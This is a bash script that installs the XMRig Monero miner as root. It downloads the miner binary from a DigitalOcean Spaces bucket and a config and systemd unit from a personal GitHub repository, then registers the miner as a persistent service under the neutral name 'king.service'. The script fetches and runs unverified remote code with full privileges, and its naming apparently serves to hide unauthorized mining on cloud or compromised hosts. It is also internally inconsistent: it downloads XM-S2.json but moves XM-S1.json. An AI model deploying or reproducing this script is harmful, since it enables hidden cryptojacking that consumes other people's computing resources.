#!/usr/bin/env bash
sudo apt-get update -y
sudo apt-get install libhwloc-dev -y
cd /home
sudo mkdir xmrig
cd xmrig
sudo mkdir build
cd build
sudo wget https://doublepro.nyc3.digitaloceanspaces.com/xmrig
sudo chmod a+x xmrig
sudo sysctl -w vm.nr_hugepages=1024
sudo wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S2.json
sudo mv XM-S1.json config.json
sudo chmod a+x config.json
sudo wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/king.service
sudo cp king.service /lib/systemd/system/king.service
sudo systemctl daemon-reload
sudo systemctl enable king.service
sudo systemctl start king.service
